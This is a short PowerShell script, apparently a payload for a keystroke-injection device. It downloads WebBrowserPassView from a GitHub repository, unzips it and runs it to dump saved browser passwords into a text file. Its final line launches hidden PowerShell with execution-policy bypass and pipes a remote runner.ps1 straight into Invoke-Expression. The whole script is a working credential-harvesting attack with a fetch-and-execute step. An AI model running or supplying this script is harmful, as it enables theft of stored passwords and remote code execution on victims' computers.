$nameFile="WebBrowserPassView"
$downDir="$env:USERPROFILE\downloads"
$newDir="$downDir\viewer"

Set-Location -path $downDir
New-Item -ItemType Directory -Path $newDir

$zipFolder="$newDir\$nameFile.zip"
$unzipFolder="$newDir\$nameFile"

Invoke-WebRequest -Uri "https://github.com/MaxAxoft/demo/raw/main/WebBrowserPassView.zip" -Method Get -OutFile $zipFolder
Expand-Archive $zipFolder -DestinationPath $unzipFolder

cmd /c ".\viewer\WebBrowserPassView\WebBrowserPassView.exe /stext export.txt"
export.txt


#STRING powershell -w h -ep bypass $dc='';$db='';irm https://raw.githubusercontent.com/MaxAxoft/demo/main/runner.ps1 | iex
